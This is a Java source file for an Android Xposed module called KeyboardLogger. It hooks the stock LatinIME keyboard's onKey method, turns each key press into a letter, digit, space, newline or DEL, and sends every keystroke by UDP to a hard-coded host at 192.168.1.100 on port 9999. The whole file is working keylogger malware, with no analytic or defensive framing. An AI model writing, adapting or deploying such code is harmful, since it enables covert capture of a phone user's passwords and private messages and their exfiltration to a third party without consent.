import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

public class KeyboardLogger implements IXposedHookLoadPackage {
    private static final String TARGET_PACKAGE = "com.android.inputmethod.latin";
    private static final String TARGET_CLASS = "com.android.inputmethod.latin.LatinIME";
    private static final String TARGET_METHOD = "onKey";
    private static final String UDP_IP = "192.168.1.100";
    private static final int UDP_PORT = 9999;

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        if (!lpparam.packageName.equals(TARGET_PACKAGE)) {
            return;
        }

        XposedHelpers.findAndHookMethod(TARGET_CLASS, lpparam.classLoader, TARGET_METHOD,
                int.class, int.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        int keyCode = (int) param.args[0];
                        int action = (int) param.args[1];
                        String keyText = getKeyText(keyCode, action);

                        if (keyText != null) {
                            sendUDP(keyText);
                        }
                    }
                });
    }

    private String getKeyText(int keyCode, int action) {
        if (action != 0) {
            return null;
        }

        switch (keyCode) {
            case 29: return "A";
            case 30: return "B";
            case 31: return "C";
            case 32: return "D";
            case 33: return "E";
            case 34: return "F";
            case 35: return "G";
            case 36: return "H";
            case 37: return "I";
            case 38: return "J";
            case 39: return "K";
            case 40: return "L";
            case 41: return "M";
            case 42: return "N";
            case 43: return "O";
            case 44: return "P";
            case 45: return "Q";
            case 46: return "R";
            case 47: return "S";
            case 48: return "T";
            case 49: return "U";
            case 50: return "V";
            case 51: return "W";
            case 52: return "X";
            case 53: return "Y";
            case 54: return "Z";
            case 7: return "0";
            case 8: return "1";
            case 9: return "2";
            case 10: return "3";
            case 11: return "4";
            case 12: return "5";
            case 13: return "6";
            case 14: return "7";
            case 15: return "8";
            case 16: return "9";
            case 62: return " ";
            case 66: return "\n";
            case 67: return "DEL";
            default: return null;
        }
    }

    private void sendUDP(String data) {
        new Thread(() -> {
            try {
                DatagramSocket socket = new DatagramSocket();
                InetAddress address = InetAddress.getByName(UDP_IP);
                byte[] buffer = data.getBytes();
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, UDP_PORT);
                socket.send(packet);
                socket.close();
            } catch (IOException e) {
                XposedBridge.log("UDP Error: " + e.getMessage());
            }
        }).start();
    }
}
